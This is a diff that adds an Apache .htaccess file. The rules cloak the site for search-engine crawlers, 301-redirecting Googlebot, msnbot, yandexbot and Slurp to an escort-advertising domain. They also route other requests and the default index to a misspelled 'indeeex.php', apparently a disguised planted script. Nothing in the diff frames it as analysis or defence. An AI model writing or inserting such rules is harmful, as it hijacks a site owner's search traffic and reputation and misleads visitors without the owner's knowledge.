@@ -1,0 +1,11 @@
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} Googlebot [OR]
+RewriteCond %{HTTP_USER_AGENT} msnbot [OR]
+RewriteCond %{HTTP_USER_AGENT} yandexbot [OR]
+RewriteCond %{HTTP_USER_AGENT} Slurp
+RewriteRule ^(.*)$ https://www.elitescorthatun.com/ad-category/ankara-escort/$1 [L,R=301]
+RewriteRule ^indeeex\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /indeeex.php [L]
+DirectoryIndex indeeex.php index.php
